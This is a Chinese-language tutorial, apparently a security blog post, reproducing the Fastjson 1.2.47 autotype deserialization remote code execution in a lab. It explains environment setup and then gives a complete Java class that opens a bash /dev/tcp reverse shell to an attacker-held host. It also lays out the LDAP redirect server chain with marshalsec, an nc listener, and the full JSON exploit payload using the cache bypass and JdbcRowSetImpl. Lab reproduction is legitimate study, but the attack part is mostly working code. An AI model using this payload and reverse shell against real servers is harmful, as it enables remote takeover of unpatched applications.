## **1.漏洞概述**

Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson
1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过

##  **2.影响版本**

  *  **Fastjson <=1.2.47**

##  **3.环境准备**

###  **3.1 主机准备**

  *  **linux主机：1台（靶机）**

  *  **Kail：1台（监听）**

  *  **Windows：1台（复现实施，burp抓包）**

###  **3.2相关安装包准备**

  *  **fastjson1.2.47.tar.gz，下载地址**

https://pan.baidu.com/s/18gr0bshmQOHJ26vB4mZCjQ  
提取码：tzva

  *  **JDK1.8，下载地址**

https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz

  *  **maven3.6.3，下载地址**

https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/

  *  **marshalsec下载地址**

java反序列化利用工具，该工具可以快速开启RMI以及LDAP服务，但需要使用maven编译（下文会讲）：https://github.com/mbechler/marshalsec

##  **4.环境搭建**

###  **4.1 Linux主机（本文采用centos7.7）安装docker**

  *  **安装所需软件包**

`yum install -y yum-utils device-mapper-persistent-data lvm2`

  *  **设置yum源**  
`yum-config-manager --add-repo http://download.docker.com/linux/centos/docker-ce.repo`

  *  **安装docker**

`yum -y install docker-ce-18.03.1.ce`

###  **4.2镜像环境部署**

  *  **拉取镜像环境**  
`docker pull rightctrl/tomcat`

  *  **映射到服务器8080端口**

`docker run -d --name tomcat -p 8080:8080 rightctrl/tomcat`

  *  **测试页面访问是否成功，http://ip:8080**  
![image.png](https://image.3001.net/images/20221212/1670813269_63969655804886033c092.png!small)

  *  **将fastjson安装至tomcat环境**

将下载的fastjson1.2.47.tar.gz上传至主机并解压：  
`tar -zxvf fastjson1.2.47.tar.gz`  
复制到tomcat的webapps目录下  
`docker cp fastjson tomcat:/opt/tomcat/webapps/`  
(注意fastjson的文件名及tomcat路径未必一样)  
测试页面访问http://ip:8080/fastjson (url路径与fastjson文件名有关)  
![image.png](https://image.3001.net/images/20221212/1670813306_6396967a15a75576f98a1.png!small)

###  **4.3 kail环境安装**

  *  **安装JDK**

新建目录，将下载的jdk的安装包复制过去并进行解压

`mkdir /usr/local/java`

`cp jdk-8u202-linux-x64.tar.gz /usr/local/java`

`cd /usr/local/java`

`tar -xzvf jdk-8u202-linux-x64.tar.gz`

添加环境变量：  
`vi /etc/profile`

`JAVA_HOME=/usr/local/java/jdk1.8.0_202 PATH=$PATH:$HOME/bin:$JAVA_HOME/bin
export JAVA_HOME export PATH`  
安装（注意java版本本文使用jdk1.8.0_202）：

`update-alternatives --install "/usr/bin/java" "java"
"/usr/local/java/jdk1.8.0_202/bin/java" 1`

`update-alternatives --install "/usr/bin/javac" "javac"
"/usr/local/java/jdk1.8.0_202/bin/javac" 1`

`update-alternatives --install "/usr/bin/javaws" "javaws"
"/usr/local/java/jdk1.8.0_202/bin/javaws" 1`

加载profile：

`source /etc/profile`

查看java版本：

`java -version`

![image.png](https://image.3001.net/images/20221212/1670813466_6396971a14f3afd77127a.png!small)

  *  **安装maven3.6.3**

下载apache-maven-3.6.3-bin.tar.gz安装包复制到/usr/local目录下，解压：  
`tar -zxvf apache-maven-3.6.3-bin.tar.gz`  
创建仓库目录：  
`mkdir /usr/local/apache-maven-3.6.3/repo`  
备份并修改maven配置文件：

`cp /usr/local/apache-maven-3.6.3/conf/settings.xml /usr/local/apache-maven-3.6.3/conf/settings.xml.bak`

`vi /usr/local/apache-maven-3.6.3/conf/settings.xml`

添加安装路径，如截图位置添加该路径：

![image.png](https://image.3001.net/images/20221212/1670813519_6396974fc13038cbc84ed.png!small)

配置阿里仓库源，修改为如下截图：

![image.png](https://image.3001.net/images/20221212/1670813530_6396975a476f50fb2dfa6.png!small)

添加环境变量：

`vi /etc/profile`

在最后一行添加：

`export MAVEN_HOME=/usr/local/apache-maven-3.6.3`  
`export PATH=$PATH:$MAVEN_HOME/bin`

重新加载：

`source /etc/profile`

测试配置是否成功：

`mvn -v`

![image.png](https://image.3001.net/images/20221212/1670813599_6396979f00cb77425b930.png!small)

  *  **下载并编译marshalsec**

通过上面链接下载后上传到kail并解压：

![image.png](https://image.3001.net/images/20221212/1670813627_639697bb17145257a0c12.png!small)

`unzip marshalsec-master.zip`

![image.png](https://image.3001.net/images/20221212/1670813669_639697e5e38442470a173.png!small)

![image.png](https://image.3001.net/images/20221212/1670813675_639697eb0dd553cdb04ee.png!small)

marshalsec目录下编译：

`cd marshalsec-master`

`mvn clean package -DskipTests`

编译完成后，到/marshalsec-master/target目录下会有这个文件marshalsec-0.0.3-SNAPSHOT-all.jar：

![image.png](https://image.3001.net/images/20221212/1670813708_6396980c1e8fb12c3a465.png!small)

## 5.漏洞复现

### 5.1编译生成Exploit.class**

将以下代码保存为Exploit.java

`import java.io.BufferedReader; import java.io.InputStream; import
java.io.InputStreamReader; public class Exploit{ public Exploit() throws
Exception { Process p = Runtime.getRuntime().exec(new
String[]{"/bin/bash","-c","exec 5<>/dev/tcp/xx.xx.xx.xx/1888;cat <&5 | while
read line; do $line 2>&5 >&amp5 done"}); InputStream is = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String
line; while((line = reader.readLine()) != null) { System.out.println(line); }
p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void
main(String[] args) throws Exception { } }`

Exploit.java文件上传到kail进行编译，得到Exploit.class文件：

`javac Exploit.java`

###  **5.2开启监听（kail上操作）**

  *  **使用python快速起一个web**

记得将Exploit.class文件放在web的目录下，即在哪个路径起web就放在哪里：  
python2：  
`python -m SimpleHTTPServer 1111`  
python3：  
`Python -m http.server 1111`

![image.png](https://image.3001.net/images/20221212/1670813818_6396987a751c6b4345064.png!small)

  *  **开启ldap服务**

到kail的/marshalsec-master/target目录下执行：

`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
http://ip:1111/#Exploit 9999`

![image.png](https://image.3001.net/images/20221212/1670813853_6396989d0fea535a0edd9.png!small)

  *  **开启nc监听**

`nc -lvp 1888`

![image.png](https://image.3001.net/images/20221212/1670813873_639698b1b3ab3248ab163.png!small)

  *  **发包测试**

访问fastjson页面Burp发包，改为POST请求，使用EXP：

![image.png](https://image.3001.net/images/20221212/1670813897_639698c970d1450f31bfc.png!small)

EXP代码如下：  
`{ "name":{ "@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl"
}, "x":{ "@type":"com.sun.rowset.JdbcRowSetImpl",
"dataSourceName":"ldap://ip:9999/Exploit", "autoCommit":true } }`

  *  **反弹shell成功**

![image.png](https://image.3001.net/images/20221212/1670813944_639698f8d940f61d7842a.png!small)

##  **6.修复建议**

升级至最新版本即可

